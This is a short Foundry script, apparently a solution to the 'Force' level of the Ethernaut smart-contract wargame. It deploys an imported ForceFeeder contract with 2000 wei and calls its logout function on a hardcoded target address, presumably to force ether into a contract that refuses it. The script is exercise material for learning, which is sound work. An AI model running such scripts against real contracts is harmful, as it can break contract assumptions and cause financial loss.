// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {ForceFeeder} from "../src/Lv-07/Force.sol";

contract ForceScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Force INSTANCE ADDRESS
        ForceFeeder _feeder =  new ForceFeeder{value: 2000}();
        _feeder.logout(0x991A61439550BF66D92F1508176bE28DB364036a);
        vm.stopBroadcast();
    }
}